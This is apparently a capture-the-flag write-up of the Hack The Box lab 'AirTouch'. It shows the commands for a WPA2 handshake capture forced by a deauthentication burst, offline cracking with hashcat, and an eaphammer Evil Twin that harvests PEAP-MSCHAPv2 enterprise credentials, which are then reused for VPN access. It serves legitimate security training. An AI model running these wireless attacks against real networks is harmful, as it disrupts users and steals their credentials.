---
title: "AirTouch"
difficulty: Medium
os: linux
points: 30
rating: 4.4
date: 2026-01-17
avatar: assets/htb/airtouch.png
tags: [802.11, wpa2-psk, evil-twin, peap-mschapv2, eaphammer, aircrack-ng, wifi]
htb_url: https://app.hackthebox.com/machines/AirTouch
---
## Summary

AirTouch is a rare wireless-focused Linux machine. The chain begins on the air: I capture an 802.11 WPA2-PSK 4-way handshake, crack it with `hashcat -m 22000`, and associate to the home network. From there I stand up an Evil Twin access point with `eaphammer` to harvest PEAP-MSCHAPv2 credentials from a connecting client. Those enterprise creds unlock a VPN, which drops me onto the internal subnet where a standard Linux privesc playbook finishes the job.

## Enumeration

With a monitor-mode-capable adapter, I start by killing interfering processes and putting the interface into monitor mode.

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
# -> wlan0mon
iwconfig wlan0mon
```

Sweeping the airwaves reveals the target SSID and the channel it lives on.

```bash
sudo airodump-ng wlan0mon
# Note BSSID and CH of target SSID, e.g. AIRTOUCH_HOME on ch 6
```

Once associated to `AIRTOUCH_HOME` (see below), I scan for the enterprise SSID `AIRTOUCH_CORP`, which authenticates with PEAP-MSCHAPv2 and becomes the next target.

## Foothold

I lock onto the home BSSID and channel, capture traffic to a file, and force a reauth with a deauthentication burst to grab the 4-way handshake.

```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon &
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c <client_mac> wlan0mon
# Wait for "WPA handshake: AA:BB:CC:DD:EE:FF" in airodump
```

I convert the capture into the modern 22000 hash format and crack it. In 2026 `-m 22000` is the right WPA2 mode, replacing the legacy `-m 2500`.

```bash
hcxpcapngtool -o cap.22000 cap-01.cap
hashcat -m 22000 cap.22000 /usr/share/wordlists/rockyou.txt
# AIRTOUCH_HOME : <psk>
```

With the PSK recovered, I build a `wpa_supplicant` config and join the network, pulling an address over DHCP.

```bash
sudo wpa_passphrase AIRTOUCH_HOME '<psk>' > wpa.conf
sudo wpa_supplicant -B -i wlan0 -c wpa.conf
sudo dhclient wlan0
```

Now on the home network, I pivot to harvesting enterprise credentials. I stand up a rogue AP impersonating `AIRTOUCH_CORP`, the PEAP-MSCHAPv2 enterprise SSID, using `eaphammer`.

```bash
./eaphammer --auth peap --essid AIRTOUCH_CORP \
            --interface wlan1 -i wlan0 --creds
```

When a client roams to the Evil Twin, it hands over a MSCHAPv2 challenge/response pair.

```
user@airtouch.htb  challenge: <c>  response: <r>
```

PEAP-MSCHAPv2 reduces to a weak DES brute-force, so the captured exchange cracks offline with `hashcat -m 5500`.

```bash
hashcat -m 5500 ntlm.txt /usr/share/wordlists/rockyou.txt
# user@airtouch.htb : <password>
```

## Privilege Escalation

The enterprise credentials authenticate the recovered OpenVPN profile, and once the tunnel is up the internal subnet is reachable.

```bash
sudo openvpn --config airtouch.ovpn --auth-user-pass <(echo -e "user@airtouch.htb\n<password>")
# Internal subnet now reachable (10.x.y.0/24)
```

At this point the wireless box converts into a classical Linux pivot, and the same priv-esc checklist applies: `sudo -l`, SUID binaries, writable systemd units, `cron`, an exposed Docker socket, or a kernel exploit on an old kernel.
